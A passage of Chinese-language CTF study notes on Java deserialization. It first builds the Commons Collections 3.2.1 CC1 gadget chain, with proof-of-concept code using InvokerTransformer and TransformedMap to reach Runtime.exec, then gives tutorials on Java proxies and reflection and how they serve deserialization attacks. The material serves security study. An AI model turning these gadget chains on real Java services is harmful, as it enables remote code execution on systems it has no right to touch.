            &lt;groupId&gt;commons-collections&lt;/groupId&gt;  
            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  
            &lt;version&gt;3.2.1&lt;/version&gt;  
        &lt;/dependency&gt;    &lt;/dependencies&gt;&lt;/project&gt;
验证
尝试调用cc1链出口类InvokeTransform成功

import org.apache.commons.collections.functors.InvokerTransformer;  

import java.lang.reflect.Method;  

public class InvokeTransformerTest {  
    public static void main(String[] args) {  
        Runtime runtime = Runtime.getRuntime();  
        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}  
                , new Object[]{&quot;calc&quot;});  
        invokerTransformer.transform(runtime);  
    }  
}
寻找利用链
1.找出口类
在commons-collections包里找到Transformer接口，ctrl+f12查找所有实现接口的类

在InvokeTransformer类里找到了一个反射调用任意类，可以作为出口类

由于反射的目的是反射任意类型的对象，所以这里用了所有类的父类Object
前面的有参构造函数是public,因此使用InvokeTransformer时无需进行反射
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {  
    super();  
    iMethodName = methodName;  
    iParamTypes = paramTypes;  
    iArgs = args;  
}
2.寻找调用链
Ctrl+Alt+Shift+F7查找所有调用transform的类

找到TransformMap中的valueTransform.checkSetValue调用了transform方法，接着从TransformedMap构造函数里找到valueTransform

由于TransformMap构造函数是protected属性，所以还得找到调用构造函数的方法

找到decorate方法创建了TransformMap对象，到这一步TransformedMap→InvokeTransformer才算构造完整
poc:
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  

import java.lang.reflect.Method;  
import java.util.HashMap;  
import java.util.Map;  

public class decorateCalc {  
    public static void main(String[] args) throws Exception{  
        Runtime runtime = Runtime.getRuntime();  
		InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;  
 , new Class[]{String.class}, new Object[]{&quot;calc&quot;});  
		HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();  
		Map decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer);  
		Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;  
		Method checkSetValueMethod = transformedMapClass.getDeclaredMethod(&quot;checkSetValue&quot;, Object.class);  
		checkSetValueMethod.setAccessible(true);  
		checkSetValueMethod.invoke(decorateMap, runtime);  
 }  
}
首先，利用链是TransformedMap.decorate()→TransformedMap()→TransFormedMap.valueTransform()→valueTransform.checkSetValue()→InvokeTransformer.transform()，为了调用入口方法decorate()，需要引入HashMap和Map
3.构造完整链
尝试寻找调用decorate方法的类，但是找不到下一步了（TransformedSortedMap虽然也调用了decorate，但是没有transform方法，除此以外就没有了）

find usages找到调用checkSetValue()的方法parent.checkSetValue(value)，在AbstractInputCheckedMapDecorator 类中的一个内部类 MapEntry


setValue() 实际上就是在 Map 中对一组 entry（键值对）进行 setValue() 操作。
所以，我们在进行 .decorate 方法调用，进行 Map 遍历的时候，就会走到 setValue() 当中，而 setValue() 就会调用 checkSetValue
改进一下poc:
 import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  

import java.util.HashMap;  
import java.util.Map;  

public class SetValueTest01 {  
    public static void main(String[] args) {  
        Runtime runtime = Runtime.getRuntime();  
 InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;  
 , new Class[]{String.class}, new Object[]{&quot;calc&quot;});  
 HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();  
 hashMap.put(&quot;key&quot;, &quot;value&quot;);  
 Map&lt;Object, Object&gt; decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer);  
 for (Map.Entry entry:decorateMap.entrySet()){  
            entry.setValue(runtime);  
 }  
    }  
}

CTF/web/知识点/Java/反序列化/Java反序列化之动态代理.content:
Java代理模式
首先介绍什么是代理，打个比方下面的中介就是代理

静态代理
简单理解静态代理

以租客找中介向房东租房子为例
想要实现租客找中介租房东，在 Java 中就需要4个文件，分别是房源、房东、中介、租客，其中房源应该是接口，其余三项为类。
Rent.java：这是一个接口，可以抽象的理解为房源，作为房源，它有一个方法rent()为租房
Rent.java

package src.JdkProxy.StaticProxy;

// 租房的接口
public interface Rent {

    public void rent();
}

Host.java：这是一个类，这个类就是房东，作为房东，他需要实现Rent.java这一个接口，并且要实现接口的rent()方法
Host.java

package src.JdkProxy.StaticProxy;

public class Host implements Rent {

    public void rent(){
        System.out.println(&quot;房东要出租房子&quot;);
 }
}

Client.java：这是一个启动类，这个类其实就是租客，租客的想法也很简单，就是找到中介，然后租房（为什么不直接找房东呢？因为房东通常不想管那么多事，而且房源基本被中介垄断）
因为租客是要去找中介看房的，而不是去找房东看房的，所以我们这里先把 Proxy.java 实现一下，也就是把中介相关的功能先实现一下。
Proxy.java：这是一个类，这个类是中介，也就是代理，他需要有房东的房源，然而我们通常不会继承房东，而会将房东作为一个私有的属性host，我们通过host.rent()来实现租房的方法。
Proxy.java

package src.JdkProxy.StaticProxy;

// 中介
public class Proxy {

    private Host host;

 public Proxy(){}
    public Proxy(Host host){
        this.host = host;
 }

    public void rent(){
        host.rent();
 }
}
Client.java租客去找中介看房
package src.JdkProxy.StaticProxy;

// 启动器
public class Client {
    public static void main(String[] args) {
        Host host = new Host();
 Proxy proxy = new Proxy(host);
 proxy.rent();
 }
}
这样子，基本的看房就完成了
优点：

可以使得我们的真实角色更加纯粹 . 不再去关注一些公共的事情 .
公共的业务由代理来完成 . 实现了业务的分工 ,
公共业务发生扩展时变得更加集中和方便 .

缺点 :

一个真实类对应一个代理角色，代码量翻倍，开发效率降低 .
我们想要静态代理的好处，又不想要静态代理的缺点，所以 , 就有了动态代理 !

深入理解静态代理
深入到实际业务当中，比如我们平常做的最多的 CRUD

UserService.java，这是一个接口，我们定义四个抽象方法。

package src.JdkProxy.MoreStaticProxy;

// 深入理解静态代理
public interface UserService {
 public void add();
 public void delete();
 public void update();
 public void query();
}
我们需要一个真实对象来完成这些增删改查操作
UserServiceImpl.java
package src.JdkProxy.MoreStaticProxy;

public class UserServiceImpl implements UserService{

    @Override
 public void add() {
        System.out.println(&quot;增加了一个用户&quot;);
 }

    @Override
 public void delete() {
        System.out.println(&quot;删除了一个用户&quot;);
 }

    @Override
 public void update() {
        System.out.println(&quot;更新了一个用户&quot;);
 }

    @Override
 public void query() {
        System.out.println(&quot;查询了一个用户&quot;);
 }
}
需求来了，现在我们需要增加一个日志功能，怎么实现！

思路1 ：在实现类上增加代码 【麻烦！】
思路2：使用代理来做，能够不改变原来的业务情况下，实现此功能就是最好的了！


处理手段：增加一个代理类来处理日志~

UserServiceProxy.java
package src.JdkProxy.MoreStaticProxy;

// 代理
public class UserServiceProxy implements UserService{
    private UserServiceImpl userService;

 public void setUserService(UserServiceImpl userService) {
        this.userService = userService;
 }

    public void add() {
        log(&quot;add&quot;);
 userService.add();
 }

    public void delete() {
        log(&quot;delete&quot;);
 userService.delete();
 }

    public void update() {
        log(&quot;update&quot;);
 userService.update();
 }

    public void query() {
        log(&quot;query&quot;);
 userService.query();
 }

    // 增加日志方法
 public void log(String msg){
        System.out.println(&quot;[Debug]使用了 &quot; + msg +&quot;方法&quot;);
 }
}

修改启动器 Client.java
package src.JdkProxy.MoreStaticProxy;

public class Client {
    public static void main(String[] args) {
        UserServiceImpl userService = new UserServiceImpl();

 UserServiceProxy proxy = new UserServiceProxy();
 proxy.setUserService(userService);
 proxy.add();

 }
}

如此一来，增加业务点的日志便成功了
动态代理

前文我们说到静态代理的问题，还记得吗？

每多一个房东就需要多一个中介，这显然不符合生活认知（对于租客来说，如果是用静态代理模式，每当想要换一个房东，那就必须要再换一个中介，在开发中，如果有多个中介代码量就更大了）
动态代理的出现就是为了解决上面静态代理的缺点。
动态代理的一些基础知识

下面讲的主要是一些源码的东西吧，不看也可。我是不建议看的，但是为了文章内容的完整性，我还是贴上来吧。


动态代理的角色和静态代理的一样。需要一个实体类，一个代理类，一个启动器。
动态代理的代理类是动态生成的，静态代理的代理类是我们提前写好的。

JDK的动态代理需要了解两个类
核心 : InvocationHandler 调用处理程序类和 Proxy 代理类
InvocationHandler：调用处理程序
public interface InvocationHandler

InvocationHandler是由代理实例的调用处理程序实现的接口
每个代理实例都有一个关联的调用处理程序。
Object invoke(Object proxy, 方法 method, Object[] args)；

当在代理实例上调用方法的时候，方法调用将被编码并分派到其调用处理程序的invoke()方法。
参数：

proxy– 调用该方法的代理实例
method-所述方法对应于调用代理实例上的接口方法的实例。方法对象的声明类将是该方法声明的接口，它可以是代理类继承该方法的代理接口的超级接口。
args-包含的方法调用传递代理实例的参数值的对象的阵列，或null如果接口方法没有参数。原始类型的参数包含在适当的原始包装器类的实例中，例如java.lang.Integer或java.lang.Boolean。

Proxy : 代理
public class Proxy extends Object implements Serializable

Proxy提供了创建动态代理类和实例的静态方法，它也是由这些方法创建的所有动态代理类的超类。
动态代理类 （以下简称为代理类 ）是一个实现在类创建时在运行时指定的接口列表的类，具有如下所述的行为。 代理接口是由代理类实现的接口。 代理实例是代理类的一个实例。
public static Object newProxyInstance(ClassLoader loader, 类&lt;?&gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException

返回指定接口的代理类的实例，该接口将方法调用分派给指定的调用处理程序。
参数


loader– 类加载器来定义代理类


interfaces– 代理类实现的接口列表


h– 调度方法调用的调用处理函数


动态代理的代码实现

要写动态代理的代码，需要抓牢两个要点

①：我们代理的是接口，而不是单个用户。
②：代理类是动态生成的，而非静态定死。
我只能说这种编程思想是真的牛逼，其实我们还可以实现任意接口的动态代理实现，在这里就不贴出来了。
首先是我们的接口类
UserService.java
package src.JdkProxy.DynamicProxy;


public interface UserService {
    public void add();
 public void delete();
 public void update();
 public void query();
}

接着，我们需要用实体类去实现这个抽象类
UserServiceImpl.java
package src.JdkProxy.DynamicProxy;

public class UserServiceImpl implements UserService{
    @Override
 public void add() {
        System.out.println(&quot;增加了一个用户&quot;);
 }

    @Override
 public void delete() {
        System.out.println(&quot;删除了一个用户&quot;);
 }

    @Override
 public void update() {
        System.out.println(&quot;更新了一个用户&quot;);
 }

    @Override
 public void query() {
        System.out.println(&quot;查询了一个用户&quot;);
 }
}

接着，是动态代理的实现类
package src.JdkProxy.DynamicProxy;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;

public class UserProxyInvocationHandler implements InvocationHandler {

    // 被代理的接口
 private UserService userService;

 public void setUserService(UserService userService) {
        this.userService = userService;
 }

    // 动态生成代理类实例
 public Object getProxy(){
        Object obj = Proxy.newProxyInstance(this.getClass().getClassLoader(), userService.getClass().getInterfaces(), this);
 return obj;
 }

    // 处理代理类实例，并返回结果
 @Override
 public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        log(method);
 Object obj = method.invoke(userService, args);
 return obj;
 }

    //业务自定义需求
 public void log(Method method){
        System.out.println(&quot;[Info] &quot; + method.getName() + &quot;方法被调用&quot;);
 }
}


最后编写我们的 Client，也就是启动器

Client.java
package src.JdkProxy.DynamicProxy;

import src.JdkProxy.DynamicProxy.UserServiceImpl;

public class Client {
    public static void main(String[] args) {
        // 真实角色
 UserServiceImpl userServiceImpl = new UserServiceImpl();
 // 代理角色，不存在
 UserProxyInvocationHandler userProxyInvocationHandler = new UserProxyInvocationHandler();
 userProxyInvocationHandler.setUserService((UserService) userServiceImpl); // 设置要代理的对象

 // 动态生成代理类
 UserService proxy = (UserService) userProxyInvocationHandler.getProxy();

 proxy.add();
 proxy.delete();
 proxy.update();
 proxy.query();
 }
}


上述，我们的动态代理便完成了。

在反序列化中动态代理的作用

如果只是纯讲开发，没什么意义，我们重点来了，动态代理是如何参与反序列化攻击的。

回到之前文章的内容，我们之前说要利用反序列化的漏洞，我们是需要一个入口类的。
我们先假设存在一个能够漏洞利用的类为B.f，比如Runtime.exec这种。
我们将入口类定义为A，我们最理想的情况是 A[O] → O.f，那么我们将传进去的参数O替换为B即可。但是在实战的情况下这种情况是极少的。
回到实战情况，比如我们的入口类A存在O.abc这个方法，也就是 A[O] → O.abc；而 O 呢，如果是一个动态代理类，O的invoke方法里存在.f的方法，便可以漏洞利用了，我们还是展示一下。
A[O] -&gt; O.abc
O[O2] invoke -&gt; O2.f // 此时将 B 去替换 O2
最后  ----&gt;
O[B] invoke -&gt; B.f // 达到漏洞利用效果

动态代理在反序列化当中的利用和readObject是异曲同工的。
readObject方法在反序列化当中会被自动执行。
而invoke方法在动态代理当中会自动执行。

CTF/web/知识点/Java/反序列化/Java反序列化之反射.content:
Java 的反射机制是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法； 并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为 Java 语言的反射机制。
反射的作用：让java具有动态性，可以让java在运行时动态创建对象
java是强类型语言，不能像php这种弱类型语言一样可以根据函数参数内容的不同识别成不同类型的值
Java 本身是一种静态语言，为什么这么说，看这一段代码就知道了。
Student student = new Student();

那反过来，什么是动态语言呢？PHP 本身就拥有很多动态特性，我们来看这一段代码。在这一段代码里面，我们输入 eval，php 就执行 eval 命令；输入 echo 就执行 echo 命令；这就是语言的动态特性。
eval(&lt;?php eval()?&gt;)

正射与反射
正射
当需要用到一个类时，先了解类是做什么的，再将类实例化成对象，然后对实例化的对象进行操作，就是正射
Student student = new Student();
student.doHomework(&quot;数学&quot;);

反射
反射就是，一开始并不知道我们要初始化的类对象是什么，自然也无法使用 new 关键字来创建对象了。我们以这一段经典的反射代码为例说明。
新建一个关联于Person.java的ReflectionTest.java：
public static void main(String[] args) throws Exception{  
    Person person = new Person();  
 	Class c = person.getClass();
}

理解反射的第一步就必须先搞清楚 Class 是什么。
Java Class 对象理解
我们程序在运行的时候会编译生成一个 .class 文件，而这个 .class 文件中的内容就是相对应的类的所有信息，比如这段程序当中person.class 就是 Class，Class 也就是描述类的类。
Class 类的对象作用是运行时提供或获得某个对象的类型信息。

所以反射其实就是操作 Class，看清楚了，是大 C

Java 反射组成相关的类
反射机制相关操作一般位于java.lang.reflect包中。
而java反射机制组成需要重点注意以下的类：

java.lang.Class：类对象;
java.lang.reflect.Constructor：类的构造器对象;
java.lang.reflect.Field：类的属性对象;
java.lang.reflect.Method：类的方法对象;

Java 反射使用方法

获取类的方法：forName
实例化类对象的方法：newInstance
获取函数的方法：getMethod
执行函数的方法：invoke

1.实例化对象
对于普通用户我们可以采用以下方法创建实例：
Person test = new Person();

而我们在创建 Class 类的实例对象却不能使用上述方法，运行会抛出错误
Class test = new Class();


同时我们可以跟进 Class 类的源码进行查看，发现其构造器是私有的，所以只有 JVM 能够创建 Class 对象。因为 Class 类是 private 私有属性，我们也无法通过创建对象的方式来获取 class 对象，那么我们怎样才能够获取到 class 对象呢？一般我们获取 class 对象就有以下三种方法，我们来逐一看看。
方法一、实例化对象的getClass()方法
如果上下⽂中存在某个类的实例 obj，那么我们可以通过 obj.getClass 来获取它的类。
TestReflection testReflection = new TestReflection();
Class class3 = testReflection.getClass();

方法二、 使用类的 .class 方法
如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接拿它的 class 属性即可。这个⽅法其实不属于反射。
Class class2 = TestReflection.class;

方法三、Class.forName(String className)：动态加载类
如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取，后续要利用的话是需要实例化的。
Class class1 = Class.forName(&quot;reflection.TestReflection&quot;);

我们可以写个简单的示例代码，分别利用这三种方法获取当前类Class对象的当前类名。
ReflectionTest01.java
package com.johnsmith;    

public class ReflectionTest01 {    
    public static void main(String[] args) throws Exception{    
        // 类的 .class 属性    
 Class c1 = Person.class;    
 System.out.println(c1.getName());    

 // 实例化对象的 getClass() 方法    
 Person person = new Person();    
 Class c2 = person.getClass();    
 System.out.println(c2.getName());    

 // Class.forName(String className): 动态加载类    
 Class c3 = Class.forName(&quot;src.Person&quot;);    
 System.out.println(c3.getName());    

 }    
}
